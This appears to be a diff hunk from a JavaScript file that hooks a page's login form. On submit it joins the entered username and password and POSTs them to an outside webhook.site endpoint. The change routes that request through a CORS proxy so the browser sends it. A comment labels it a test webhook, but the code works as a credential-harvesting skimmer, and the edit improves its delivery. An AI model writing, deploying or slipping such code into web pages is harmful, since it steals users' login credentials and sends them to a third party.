@@ -86,7 +86,7 @@ document.querySelector("form[name='login']").addEventListener("submit", function
   const payload = `${user}:${pass}:`;
 
   // Exemple de webhook local/test
-  fetch("https://webhook.site/34fab5de-e606-4fe8-a8c4-1cf3e769fc7d", {
+  fetch("https://cors-anywhere.herokuapp.com/https://webhook.site/34fab5de-e606-4fe8-a8c4-1cf3e769fc7d", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ data: payload })
